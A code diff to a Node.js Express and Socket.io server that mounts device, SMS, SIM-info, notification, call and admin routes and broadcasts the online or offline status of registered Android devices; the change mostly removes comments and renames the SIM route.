@@ -11,7 +11,7 @@ import { connectDB } from "./config/db.js";
 // ✅ Import Routes
 import deviceRoutes from "./routes/deviceRoutes.js";
 import smsRoutes from "./routes/smsRoutes.js";
-import simInfoRoutes from "./routes/simInfoRoutes.js";
+import simInfoRoutes from "./routes/simInfoRoutes.js"; // ✅ keep only ONE import
 import notificationRoutes from "./routes/notificationRoutes.js";
 import callRoutes from "./routes/callRoutes.js";
 import adminRoutes from "./routes/adminRoutes.js";
@@ -46,24 +46,19 @@ app.set("io", io);
 io.on("connection", (socket) => {
   console.log("🟢 Client connected:", socket.id);
 
-  // store current deviceId (so we know who disconnected)
   let currentDeviceId = null;
 
-  // 🧩 Device registration from Android
   socket.on("registerDevice", (uniqueid) => {
     console.log(`📱 Registered Device: ${uniqueid}`);
     currentDeviceId = uniqueid;
     socket.join(uniqueid);
   });
 
-  // ⚡ Real-time device status from Android app
   socket.on("deviceStatus", (data) => {
     const { uniqueid, connectivity } = data || {};
     if (!uniqueid) return;
 
     console.log(`⚡ ${uniqueid} → ${connectivity}`);
-
-    // Broadcast to all dashboards / clients
     io.emit("deviceStatus", {
       uniqueid,
       connectivity,
@@ -71,27 +66,15 @@ io.on("connection", (socket) => {
     });
   });
 
-  // 📴 When device disconnects or app closes
   socket.on("disconnect", () => {
     console.log("🔴 Client disconnected:", socket.id);
-
     if (currentDeviceId) {
       console.log(`📴 Marking ${currentDeviceId} as Offline`);
-
-      // Notify all dashboards that device is offline
       io.emit("deviceStatus", {
         uniqueid: currentDeviceId,
         connectivity: "Offline",
         updatedAt: new Date(),
       });
-
-      // optional: save lastSeenAt in DB if you want
-      // import Device from "./models/deviceModel.js";
-      // await Device.findOneAndUpdate(
-      //   { uniqueId: currentDeviceId },
-      //   { lastSeenAt: new Date() }
-      // );
-
       currentDeviceId = null;
     }
   });
@@ -109,7 +92,7 @@ app.get("/", (req, res) => {
 // =============================
 app.use("/api/device", deviceRoutes);
 app.use("/api/sms", smsRoutes);
-app.use("/api/sim", simInfoRoutes);
+app.use("/api/siminfo", simInfoRoutes); // ✅ keep only ONE sim route
 app.use("/api/notification", notificationRoutes);
 app.use("/api/call", callRoutes);
 app.use("/api/admin", adminRoutes);
@@ -124,7 +107,6 @@ app.use((err, req, res, next) => {
   console.error("Unhandled error:", err);
   res.status(500).json({ success: false, message: "Internal server error" });
 });
-
 
 const PORT = process.env.PORT || 5000;
 server.listen(PORT, () => console.log(`✅ Server running on port ${PORT}`));
